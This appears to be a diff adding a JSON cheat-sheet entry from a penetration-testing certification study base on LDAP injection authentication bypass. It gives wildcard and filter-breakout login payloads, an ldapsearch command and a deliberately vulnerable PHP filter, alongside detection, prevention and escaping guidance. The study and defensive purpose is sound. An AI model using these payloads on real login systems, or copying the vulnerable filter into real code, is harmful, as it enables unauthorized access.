@@ -1,0 +1,89 @@
+{
+  "type": "payload",
+  "platform": "linux",
+  "requires": [
+    "network-access"
+  ],
+  "protocols": [
+    "http"
+  ],
+  "tools": [
+    "ldap"
+  ],
+  "tags": [
+    "ldap-injection",
+    "auth-bypass"
+  ],
+  "category": "Exploitation",
+  "subcategory": "LDAP Injection",
+  "certifications": [
+    "CPTS",
+    "CWES",
+    "OSCP"
+  ],
+  "primary_cert": "CPTS",
+  "source": "CPTS Module 24: Attacking Common Applications",
+  "examples": [
+    {
+      "label": "Wildcard both login fields to bypass the LDAP filter",
+      "command": "$username = \"*\"; $password = \"dummy\";"
+    },
+    {
+      "label": "ldapsearch reference for valid query syntax",
+      "command": "# ldapsearch reference:\nldapsearch -H ldap://<ip>:389 -D \"cn=admin,dc=example,dc=com\" -w <pass> -b \"ou=people,dc=example,dc=com\" \"(mail=john@example.com)\""
+    }
+  ],
+  "notes": "A bare * in both fields matches every entry when the app concatenates input straight into the filter. If * is filtered, try )(cn=* style breakouts. Confirms when a wildcard logs you in as the first user.",
+  "references": [
+    {
+      "title": "PortSwigger - LDAP Injection",
+      "url": "https://portswigger.net/web-security/ldap-injection"
+    },
+    {
+      "title": "HTB Academy - Attacking Common Applications",
+      "url": "https://academy.hackthebox.com/module/details/113"
+    },
+    {
+      "title": "OffSec PEN-200 - Web Application Attacks",
+      "url": "https://www.offsec.com/courses/pen-200/"
+    }
+  ],
+  "recommended": [
+    {
+      "id": "mass-assignment",
+      "note": "Another application-logic web vuln in this module.",
+      "rel": "alternative"
+    },
+    {
+      "id": "auth-bypass-direct-access",
+      "rel": "next",
+      "note": "Continue enumeration/technique in this area"
+    }
+  ],
+  "id": "ldap-injection-authbypass",
+  "name": "LDAP Injection - Authentication Bypass",
+  "command": "Username: *\nPassword: *",
+  "description": "When login builds an LDAP filter like (&(sAMAccountName=$user)(userPassword=$pass)), injecting the wildcard * matches any entry, bypassing authentication. Test * in each field.",
+  "opsec": "loud",
+  "mitre": [
+    "T1190"
+  ],
+  "exam": "exam-ok",
+  "defense": {
+    "why_it_works": "LDAP authentication queries that concatenate user-supplied values directly into the filter string are vulnerable to injection. Supplying a wildcard (*) as username causes the filter to match any user, bypassing authentication entirely.",
+    "prerequisites": "Application using LDAP for authentication with string-concatenated filter construction. No input sanitization or parameterized LDAP queries.",
+    "impact": "Authentication bypass -- attacker logs in as any user (often the first user, potentially an admin). Full application access without valid credentials.",
+    "detection": "Login attempts with wildcard characters (* or %) in username or password. Successful authentication for a wildcard username. LDAP server log showing filter with unescaped wildcards.",
+    "artifacts": "Application auth log (wildcard username succeeding) | LDAP server audit log (filter with * in uid field) | Web server log (POST to login with * in parameters)",
+    "prevention": "Use LDAP libraries with parameterized queries or bind variables. Escape all special LDAP characters per RFC 4515 before inserting into filters. Validate input against an allowlist of alphanumeric characters.",
+    "misconfiguration": "Application builds LDAP filter by string concatenation without escaping LDAP special characters (* ( ) \\ NUL).",
+    "vulnerable_config": "# Vulnerable LDAP filter (PHP)\n$filter = \"(&(uid=\" . $_POST['username'] . \")(userPassword=\" . $_POST['password'] . \"))\";\n// POST username=* password=* -> matches all users",
+    "secure_config": "# Escape LDAP metacharacters (RFC 4515)\nfunction ldap_escape_filter($str) {\n  $chars = ['\\\\', '*', '(', ')', \"\\x00\"];\n  $esc = ['\\\\5c', '\\\\2a', '\\\\28', '\\\\29', '\\\\00'];\n  return str_replace($chars, $esc, $str);\n}\n$filter = '(&(uid=' . ldap_escape_filter($_POST['username']) .\n           ')(userPassword=' . ldap_escape_filter($_POST['password']) . '))';\n# Or use ldap_bind() with user DN directly",
+    "evasion": "Try variations: %)(%)(uid=* or injecting OR conditions (|(uid=admin)).",
+    "sources": [
+      "HTB M24",
+      "MITRE T1190",
+      "OWASP A03:2021"
+    ]
+  }
+}
